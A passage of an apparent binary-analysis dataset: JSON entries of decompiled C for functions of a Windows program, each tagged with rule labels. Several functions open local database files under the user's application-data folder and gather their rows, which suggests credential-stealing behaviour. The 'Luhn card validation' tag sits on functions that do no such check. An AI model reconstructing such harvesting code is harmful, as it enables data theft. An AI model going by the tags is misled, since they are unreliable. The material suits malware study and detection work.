= var_ch_2 & 0xffffff00;\n    if (0xf < var_3ch) {\n        fcn.0042ac49(var_28h);\n    }\n    var_3ch = 0xf;\n    var_38h = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (0xf < var_58h) {\n        fcn.0042ac49(var_44h);\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0042ad2a(noname_4);\n    return;\n}\n",
        "token_count": 4316
    },
    "004137b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with lookup table/f2e93a0d9a164553a93d71878df6b782"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __thiscall fcn.004137b0(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_530h_8;\n    uint var_52ch_21;\n    uint var_528h_18;\n    uint var_4h_37;\n    uint var_52ch_20;\n    uint var_528h_17;\n    uint var_534h_7;\n    uint var_52ch_19;\n    uint var_528h_16;\n    uint var_4h_36;\n    uint var_530h_7;\n    uint var_52ch_18;\n    uint var_528h_15;\n    uint var_4h_35;\n    uint var_52ch_17;\n    uint var_528h_14;\n    uint var_534h_6;\n    uint var_52ch_16;\n    uint var_4h_34;\n    uint var_530h_6;\n    uint var_52ch_15;\n    uint var_528h_13;\n    uint var_4h_33;\n    uint var_52ch_14;\n    uint var_528h_12;\n    uint var_534h_5;\n    uint var_52ch_13;\n    uint var_528h_11;\n    uint var_4h_32;\n    uint var_530h_5;\n    uint var_52ch_12;\n    uint var_528h_10;\n    uint var_4h_31;\n    uint var_52ch_11;\n    uint var_528h_9;\n    uint var_534h_4;\n    uint var_52ch_10;\n    uint var_528h_8;\n    uint var_4h_30;\n    uint var_530h_4;\n    uint var_52ch_9;\n    uint var_528h_7;\n    uint var_4h_29;\n    uint var_52ch_8;\n    uint var_528h_6;\n    uint var_534h_3;\n    uint var_52ch_7;\n    uint var_4h_28;\n    uint var_530h_3;\n    uint var_52ch_6;\n    uint var_528h_5;\n    uint var_4h_27;\n    uint var_52ch_5;\n    uint var_528h_4;\n    uint var_534h_2;\n    uint var_52ch_4;\n    uint var_4h_26;\n    uint var_530h_2;\n    uint var_52ch_3;\n    uint var_528h_3;\n    uint var_4h_25;\n    uint var_52ch_2;\n    uint var_528h_2;\n    uint var_530h;\n    uint var_52ch;\n    uint var_528h;\n    uint var_4h_24;\n    uint var_4h_23;\n    uint var_4h_22;\n    uint var_4h_21;\n    uint var_4h_20;\n    uint var_4h_19;\n    uint var_4h_18;\n    uint var_4h_17;\n    uint var_4h_16;\n    uint var_4h_15;\n    uint var_4h_14;\n    uint var_4h_13;\n    uint var_4h_12;\n    uint var_4h_11;\n    uint var_4h_10;\n    uint var_4h_9;\n    uint var_4h_8;\n    uint var_4h_7;\n    uint var_4h_6;\n    uint var_4h_5;\n    uint var_4h_4;\n    uint var_4h_3;\n    uint var_4h_2;\n    uint var_4h;\n    uint var_534h;\n    uint var_10h;\n    uint var_ch;\n    uint *arg_8h;\n    uint var_52ch_57;\n    uint var_528h_50;\n    uint var_524h;\n    uint var_52ch_56;\n    uint var_528h_49;\n    uint var_534h_19;\n    uint var_52ch_55;\n    uint var_530h_19;\n    uint var_52ch_54;\n    uint var_528h_48;\n    uint var_52ch_53;\n    uint var_528h_47;\n    uint var_534h_18;\n    uint var_52ch_52;\n    uint var_530h_18;\n    uint var_52ch_51;\n    uint var_528h_46;\n    uint var_52ch_50;\n    uint var_528h_45;\n    uint var_420h;\n    uint var_534h_17;\n    uint var_52ch_49;\n    uint var_528h_44;\n    uint var_530h_17;\n    uint var_52ch_48;\n    uint var_528h_43;\n    uint var_52ch_47;\n    uint var_528h_42;\n    uint var_534h_16;\n    uint var_52ch_46;\n    uint var_528h_41;\n    uint var_530h_16;\n    uint var_52ch_45;\n    uint var_528h_40;\n    uint var_52ch_44;\n    uint var_528h_39;\n    uint var_534h_15;\n    uint var_52ch_43;\n    uint var_528h_38;\n    uint var_31ch;\n    uint var_530h_15;\n    uint var_52ch_42;\n    uint var_528h_37;\n    uint var_52ch_41;\n    uint var_528h_36;\n    uint var_534h_14;\n    uint var_52ch_40;\n    uint var_528h_35;\n    uint var_530h_14;\n    uint var_52ch_39;\n    uint var_528h_34;\n    uint var_52ch_38;\n    uint var_528h_33;\n    uint var_534h_13;\n    uint var_52ch_37;\n    uint var_528h_32;\n    uint var_530h_13;\n    uint var_52ch_36;\n    uint var_528h_31;\n    uint var_52ch_35;\n    uint var_528h_30;\n    uint var_534h_12;\n    uint var_52ch_34;\n    uint var_528h_29;\n    uint var_530h_12;\n    uint var_52ch_33;\n    uint var_528h_28;\n    uint var_52ch_32;\n    uint var_528h_27;\n    uint var_534h_11;\n    uint var_52ch_31;\n    uint var_530h_11;\n    uint var_52ch_30;\n    uint var_528h_26;\n    uint var_52ch_29;\n    uint var_528h_25;\n    uint var_534h_10;\n    uint var_52ch_28;\n    uint var_530h_10;\n    uint var_52ch_27;\n    uint var_528h_24;\n    uint var_52ch_26;\n    uint var_528h_23;\n    uint var_534h_9;\n    uint var_52ch_25;\n    uint var_528h_22;\n    uint var_530h_9;\n    uint var_52ch_24;\n    uint var_528h_21;\n    uint var_52ch_23;\n    uint var_528h_20;\n    uint var_534h_8;\n    uint var_52ch_22;\n    uint32_t var_528h_19;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_38;\n    \n    var_4h_38 = 0xffffffff;\n    uStack12 = 0x43e8a2;\n    var_ch_2 = *in_FS_OFFSET;\n    var_528h_19 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    *(param_1 + 0x20) = param_2;\n    *(param_1 + 0x1c) = 0;\n    uVar2 = *0x45802c;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457fd8;\n    var_4h_38 = 0;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458214;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 1);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472e4, uVar2);\n    uVar2 = *0x458118;\n    var_4h_38 = 2;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x4581e0;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 3);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472e4, uVar2);\n    uVar2 = *0x457fc4;\n    var_4h_38 = 4;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457fac;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 5);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x458494;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457f14;\n    var_4h_38 = 6;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458384;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 7);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x4580f0;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457f14;\n    var_4h_38 = 8;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458384;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 9);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472e4, uVar2);\n    var_4h_38 = 10;\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472cc, uVar2);\n    uVar2 = *0x457f30;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0xb);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x458428;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458474;\n    var_4h_38 = 0xc;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x4582fc;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0xd);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x4582e4;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458518;\n    var_4h_38 = 0xe;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458058;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0xf);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x457edc;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x4581cc;\n    var_4h_38 = 0x10;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458410;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x11);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472e4, uVar2);\n    uVar2 = *0x457e00;\n    var_4h_38 = 0x12;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x4584c8;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x13);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472e4, uVar2);\n    uVar2 = *0x45808c;\n    var_4h_38 = 0x14;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457ed0;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x15);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x45845c;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458524;\n    var_4h_38 = 0x16;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458514;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x17);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x4582cc;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458524;\n    var_4h_38 = 0x18;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458514;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x19);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x457f6c;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458524;\n    var_4h_38 = 0x1a;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x458514;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x1b);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x45849c;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457e4c;\n    var_4h_38 = 0x1c;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457f2c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x1d);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x458188;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457e4c;\n    var_4h_38 = 0x1e;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457f2c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x1f);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = *0x457f70;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x45827c;\n    var_4h_38 = 0x20;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x45821c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x21);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472e4, uVar2);\n    uVar2 = *0x458164;\n    var_4h_38 = 0x22;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x457e6c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x23);\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0();\n    uVar2 = fcn.0042b420();\n    fcn.00406270(0x4472c4, uVar2);\n    uVar2 = *0x4583c8;\n    var_4h_38 = 0x24;\n    uVar1 = fcn.0042b420();\n    fcn.00406270(uVar2, uVar1);\n    uVar2 = *0x4581fc;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x25);\n    uVar1 = fcn.0042b420(*0x4581fc);\n    fcn.00406270(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412fa0(0);\n    fcn.00412550(*0x457f9c, *0x457d60, *0x457e58, *(param_1 + 0x20), 1);\n    fcn.00412550(*0x458560, *0x4581f0, *0x457da0, *(param_1 + 0x20), 0);\n    fcn.00412550(*0x457e34, *0x458068, *0x457da0, *(param_1 + 0x20), 0);\n    fcn.00412550(*0x45851c, *0x45842c, *0x457da0, *(param_1 + 0x20), 0);\n    fcn.00412830(0x4472a4, 0x4472b4, 0x4472e4, *(param_1 + 0x20));\n    fcn.0042acb0(&var_31ch, 0, 0x104);\n    fcn.0042acb0(&var_524h, 0, 0x104);\n    fcn.0042acb0(&var_528h_25, 0, 0x104);\n    fcn.0042acb0(&var_420h, 0, 0x104);\n    fcn.0042acb0(&var_528h_31, 0, 0x104);\n    (**0x469258)(&var_31ch, 0x445418);\n    (**0x469258)(&var_31ch, *0x457f40);\n    (**0x469258)(&var_31ch, 0x445418);\n    (**0x469258)(&var_528h_25, *0x457f40);\n    (**0x469258)(&var_528h_25, 0x445418);\n    (**0x469258)(&var_528h_25, *0x458040);\n    (**0x469258)(&var_528h_25, 0x445418);\n    (**0x469258)(&var_528h_25, *0x458324);\n    (**0x469258)(&var_524h, 0x445418);\n    (**0x469258)(&var_524h, &var_528h_25);\n    (**0x469258)(&var_524h, 0x445418);\n    (**0x469258)(&var_528h_31, *0x457f40);\n    (**0x469258)(&var_528h_31, 0x445418);\n    (**0x469258)(&var_528h_31, *0x458218);\n    arg_8h = &var_420h;\n    (**0x469258)(arg_8h, 0x445418);\n    (**0x469258)(&var_420h, &var_528h_31);\n    (**0x469258)(&var_420h, 0x445418);\n    fcn.00412550(&var_31ch, *0x457f40, 0x4472e4, *(param_1 + 0x20), 0);\n    fcn.00412550(&var_524h, &var_528h_25, 0x4472e4, *(param_1 + 0x20), 0);\n    fcn.00412550(&var_420h, &var_528h_31, 0x4472e4, *(param_1 + 0x20), 0);\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 6017
    },
    "00414ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414ac0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_44h, 0, 0x40);\n    fcn.0042acb0(&var_80h, 0, 0x3c);\n    var_7ch = &var_44h;\n    var_80h = 0x3c;\n    var_78h = 0x40;\n    arg_8h_00 = (**0x469150)(arg_8h, 0x10000000, &var_80h);\n    (**0x469134)(arg_8h);\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 228
    },
    "00415760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415760(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_1fc0h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1fb0h;\n    uint var_1fach;\n    uint var_1fa8h;\n    uint var_1fa4h;\n    uint uStackY60;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.0042ae40();\n    fcn.0042acb0();\n    arg_8h_00 = arg_8h;\n    (**0x469150)();\n    iVar1 = (**0x469218)();\n    if (iVar1 != 0) {\n        iVar1 = (**0x458768)();\n        if (iVar1 != 0) {\n            uStackY60 = 0x4157e7;\n            iVar1 = (**0x4587b0)();\n            if (iVar1 == 0) {\n                uStackY60 = 0x415834;\n                iVar1 = (**0x458788)();\n                if (iVar1 == 0) {\n                    uStackY60 = 0x415855;\n                    fcn.0042af40(&fcn.00415760::var_1fa4h, 0, 0);\n                    var_1fa4h._0_1_ = 0;\n                    (**0x458790)();\n                    fcn.0042ad2a(arg_8h_00);\n                    return;\n                }\n            }\n            (**0x469258)();\n            uStackY60 = 0x41589f;\n            (**0x458790)();\n            fcn.0042ad2a(arg_8h);\n            return;\n        }\n        (**0x469258)();\n    }\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 451
    },
    "00415a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00415a00(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = arg_8h;\n    var_10h = arg_ch;\n    iVar1 = (**0x469160)(&var_10h, 0, 0, 0, 0, 0, &var_8h);\n    if (iVar1 != 0) {\n        *arg_14h = var_8h;\n        arg_8h_00 = (**0x469200)(0x40, var_8h);\n        *arg_10h = arg_8h_00;\n        if (arg_8h_00 != 0) {\n            fcn.0042af40(arg_8h_00, var_4h, *arg_14h);\n        }\n    }\n    uVar2 = (**0x469300)(var_4h);\n    return uVar2 & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 285
    },
    "00415ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415ad0(uint arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    *arg_ch = 0;\n    *arg_10h = 0;\n    iVar1 = (**0x469148)(arg_ch, 0x447410, 0, 0);\n    if (-1 < iVar1) {\n        iVar1 = (**0x469120)(*arg_ch, 0x4473d4, 0x4473f0, 0x20, 0);\n        if (-1 < iVar1) {\n            iVar1 = (**0x4690fc)(*arg_ch, arg_10h, 0, 0, arg_8h, 0x20, 0);\n            if (-1 < iVar1) {\n                return 1;\n            }\n        }\n        fcn.00415a80(arg_ch, arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 216
    },
    "00415b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00415b40(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint arg_10h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = arg_8h;\n    arg_10h = arg_ch;\n    arg_8h_00 = fcn.0042ae6b(arg_ch);\n    fcn.0042af40(arg_8h_00, arg_ch_00, arg_10h);\n    var_4h = arg_8h;\n    var_8h = arg_ch;\n    arg_8h_01 = fcn.0042ae6b(arg_ch);\n    iVar1 = (**0x469160)(&var_8h, 0, 0, 0, 0, 0, &var_10h);\n    if (iVar1 != 0) {\n        if (var_10h != 0) {\n            fcn.0042af40(arg_8h_01, var_ch, var_10h);\n        }\n        *(var_10h + arg_8h_01) = 0;\n        return arg_8h_01;\n    }\n    return 0;\n}\n",
        "token_count": 316
    },
    "00415bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415bd0(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    (**0x469258)(&var_108h, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    (**0x469258)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x469100)(arg_8h, &var_108h);\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    (**0x4690ac)(&var_20ch, 0x44741c, arg_10h, arg_ch);\n    uVar3 = *0x4584a0;\n    iVar2 = (**0x4587b8)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x4692b4)(0, 999999);\n            var_210h = (**0x46923c)(uVar3);\n            iVar2 = (**0x458780)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x4587a4)(unique0x10000283, 0);\n                (**0x469258)(var_210h, uVar3);\n                (**0x469258)(var_210h, 0x447418);\n                uVar3 = (**0x4587a4)(stack0xfffffde8, 1);\n                (**0x469258)(var_210h, uVar3);\n                (**0x469258)(var_210h, 0x44540c);\n                iVar2 = (**0x458780)(stack0xfffffde8);\n            }\n            uVar3 = (**0x469150)(var_210h);\n            fcn.00429fe0(arg_1ch, &var_20ch, var_210h, uVar3);\n            fcn.0042acb0(&var_210h, 0, 4);\n        }\n        (**0x458784)(stack0xfffffde8);\n        (**0x4587bc)(var_21ch);\n    }\n    (**0x46915c)(&var_108h);\n    fcn.0042ad2a(uVar1);\n    return;\n}\n",
        "token_count": 703
    },
    "00415df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415df0(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    (**0x469258)(&var_108h, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    (**0x469258)(&var_108h, uVar1);\n    (**0x469100)(arg_8h, &var_108h, 1);\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    (**0x4690ac)(&var_20ch, 0x447430, arg_10h, arg_ch);\n    iVar2 = (**0x4587b8)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_21ch, *0x45819c, 0xffffffff, &var_210h, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x4692b4)(0, 999999);\n            *NULL = (**0x46923c)(uVar1);\n            iVar2 = (**0x458780)(var_210h);\n            while (iVar2 == 100) {\n                (**0x4587a4)(var_210h, 0);\n                uVar1 = (**0x4587a4)(var_210h, 0);\n                (**0x469258)(stack0xfffffde8, uVar1);\n                (**0x469258)(stack0xfffffde8, 0x44540c);\n                iVar2 = (**0x458780)(var_210h);\n            }\n            uVar1 = (**0x469150)(unique0x1000025d);\n            fcn.00429fe0(arg_1ch, &var_20ch, stack0xfffffde8, uVar1);\n            fcn.0042acb0(&var_215h + 1, 0, 4);\n        }\n        (**0x458784)(var_210h);\n        (**0x4587bc)(var_21ch);\n    }\n    arg_8h_00 = &var_108h;\n    (**0x46915c)();\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 661
    },
    "00415fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415fe0(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    (**0x469258)(&var_108h, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    (**0x469258)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x469100)(arg_8h, &var_108h);\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    (**0x4690ac)(&var_20ch, 0x447444, arg_10h, arg_ch);\n    uVar3 = *0x45855c;\n    iVar2 = (**0x4587b8)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x4692b4)(0, 999999);\n            var_210h = (**0x46923c)(uVar3);\n            iVar2 = (**0x458780)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x4587a4)(unique0x10000283, 0);\n                uVar4 = (**0x4587a4)(stack0xfffffde8, 1);\n                (**0x469258)(var_210h, uVar3);\n                (**0x469258)(var_210h, 0x44540c);\n                (**0x469258)(var_210h, uVar4);\n                (**0x469258)(var_210h, 0x447030);\n                iVar2 = (**0x458780)(stack0xfffffde8);\n            }\n            uVar3 = (**0x469150)(var_210h);\n            fcn.00429fe0(arg_1ch, &var_20ch, var_210h, uVar3);\n            fcn.0042acb0(&var_210h, 0, 4);\n        }\n        (**0x458784)(stack0xfffffde8);\n        (**0x4587bc)(var_21ch);\n    }\n    (**0x46915c)(&var_108h);\n    fcn.0042ad2a(uVar1);\n    return;\n}\n",
        "token_count": 707
    },
    "00416200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n\nvoid __cdecl fcn.00416200(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_110h = arg_ch;\n    iVar1 = (**0x4587a0)(arg_10h);\n    if ((iVar1 == 0) && (iVar1 = fcn.0042d9e0(0x45876c),  iVar1 < 0x20)) {\n        fcn.0042acb0(&var_108h, 0, 0x104);\n        (**0x469258)(&var_108h, arg_10h);\n        (**0x469258)(&var_108h, 0x445418);\n        (**0x469258)(&var_108h, *0x4585ac);\n        iVar1 = (**0x4690ec)(&var_108h, 0x80000000, 1, 0, 3, 0, 0);\n        var_10ch = iVar1;\n        if (iVar1 != 0) {\n            (**0x469108)(iVar1, 0, 0, 2);\n            iVar2 = (**0x4692c8)(iVar1, 0);\n            (**0x469108)(iVar1, 0, 0, 0);\n            